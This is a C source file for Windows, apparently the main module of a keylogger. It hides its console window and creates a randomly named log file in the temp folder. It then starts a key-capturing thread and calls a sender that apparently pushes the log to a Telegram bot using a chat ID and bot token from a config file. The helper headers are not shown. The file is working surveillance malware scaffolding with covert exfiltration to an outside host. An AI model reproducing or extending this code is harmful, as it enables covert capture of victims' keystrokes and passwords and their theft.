#include <windows.h>

#include "Logger.h"
#include "Telegram.h"
#include "Config.h"

#pragma warning(disable:4996)

char tempPath[500];

static char* RandomString(char* str, size_t size)
{
	const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
	--size;
	for (size_t n = 0; n < size; n++) {
		int key = rand() % (int)(sizeof charset - 1);
		str[n] = charset[key];
	}
	str[size] = '\0';

	return str;
}

static void CreateTempPath()
{
	GetTempPathA(500, tempPath);

	char randomString[10];
	RandomString(randomString, 10);

	strncat(tempPath, randomString, 500);
	strncat(tempPath, ".txt", 500);

	HANDLE hFile = CreateFileA(tempPath, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == 0) { return; }

	CloseHandle(hFile);
}

int main(int argc, char** argv)
{
	srand(time(0));
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	CreateTempPath();
	CreateThread(0, 0, KeyThread, 0, 0, 0);

	TelegramSender(TG_CHAT_ID, TG_BOT_TOKEN);
	
	return 0;
}
